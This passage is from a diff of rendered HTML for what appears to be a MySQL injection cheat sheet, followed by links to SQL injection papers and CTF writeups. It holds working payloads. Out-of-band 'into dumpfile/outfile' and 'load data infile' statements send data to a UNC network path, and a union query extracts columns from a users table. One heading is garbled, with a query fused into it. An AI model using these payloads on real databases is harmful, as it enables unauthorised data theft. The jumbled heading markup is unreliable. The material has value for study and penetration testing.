+<span class="pl-k">select</span> <span class="pl-s"><span class="pl-pds">'</span>osanda<span class="pl-pds">'</span></span> into dumpfile <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\\\</span>error<span class="pl-cce">\\</span>abc<span class="pl-pds">'</span></span>;
+<span class="pl-k">select</span> <span class="pl-s"><span class="pl-pds">'</span>osanda<span class="pl-pds">'</span></span> into outfile <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\\\</span>error<span class="pl-cce">\\</span>abc<span class="pl-pds">'</span></span>;
+load data infile <span class="pl-s"><span class="pl-pds">'</span><span class="pl-cce">\\\\</span>error<span class="pl-cce">\\</span>abc<span class="pl-pds">'</span></span> into table <span class="pl-c1">database</span>.<span class="pl-c1">table_name</span>;</pre></div>
+<br><hr><br>
+<h2>MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from <p>(select 1,2,3,4,5,6 union select * from users)a limit 1,1);References</h2>
+<ul>
+<li><a href="https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf" rel="nofollow">MySQL Out of Band Hacking - @OsandaMalith</a></li>
+<li><a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" rel="nofollow">[Sqli] Extracting data without knowing columns names - Ahmed Sultan @0x4148</a></li>
+<li><a href="https://rdot.org/forum/showpost.php?p=114&amp;postcount=1" rel="nofollow">Help по MySql инъекциям - rdot.org</a></li>
+<li><a href="https://resources.infosecinstitute.com/sql-truncation-attack/" rel="nofollow">SQL Truncation Attack - Warlock</a></li>
+<li><a href="https://hackerone.com/reports/508123" rel="nofollow">HackerOne @ajxchapman 50m-ctf writeup - Alex Chapman @ajxchapman</a></li>
+<li><a href="https://sqlwiki.netspi.com/injectionTypes/errorBased" rel="nofollow">SQL Wiki - netspi</a></li>
+<li><a href="https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100">ekoparty web_100 - 2016/10/26 - p4-team</a></li>
+</ul>
